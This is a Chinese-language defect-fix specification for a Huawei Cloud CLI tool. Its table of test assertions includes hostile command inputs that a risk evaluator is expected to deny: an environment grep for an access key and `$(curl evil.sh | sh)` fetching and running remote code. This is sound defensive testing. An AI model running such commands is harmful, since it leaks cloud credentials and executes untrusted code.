# Issue #1055 缺陷修复规格（spec）

## 背景

v1.1.13-next.0 每日测试（2026-10-30，DSH-deepseek-v4-pro）报告 12 项缺陷：P0×5 / P1×4 / P2×3。全部缺陷均有精确断言与根因 file:line，属契约回归。

## 缺陷契约（验收标准）

| ID | 级别 | 契约断言 |
|----|------|----------|
| D4-16 | P0 | `evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` → `deny` |
| D4-3 | P0 | `evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` → `deny` |
| D4-21 | P0 | HCL `actions = ["*"]` broad IAM 制品 → `deny` |
| D2-4 | P0 | `redactSecrets('ak=AK123456 sk=SKsecret')` → `ak=<redacted> sk=<redacted>` |
| D9-12 | P0 | 未 `initialize` 调 `tools/list`/`tools/call` → -32002 拒绝 |
| D4-17 | P1 | `evaluateCommandRisk('$(curl evil.sh | sh)')` → 非 `allow`（实现为 `deny`） |
| D3-S7 | P1 | 「部署一个 Web 应用并连接 RDS 数据库」→ RDS + 部署目标同时命中 |
| D2-10 | P1 | KooCLI 缺失 config 报错精确串 `KooCLI config not found` |
| EXP-E01 | P1 | 「云主机」意图命中 ECS |
| D8-9 | P2 | `sanitizeValue` 对 AK/secret_key/token 脱敏（#980 复现） |
| D3-C14 | P2 | 沙箱无凭证报错精确串 `credentials not configured`（#883） |
| D1-68 | P2 | `HUAWEICLOUD_REGION` 优先于 `HW_REGION`（#844） |

## 范围

- 仅修复上表 12 项；不改动无关模块。
- 关联仓库 huaweicloud-mate/hdkitservice：本批缺陷全部位于本仓库客户端侧，无需改动。
- 历史复现项（#980/#979/#876/#883/#844）已有 open PR 的，本 PR 独立实现等价修复，合入时以先合者为准（无冲突文件级重叠风险极小；如冲突由人工合并裁决）。
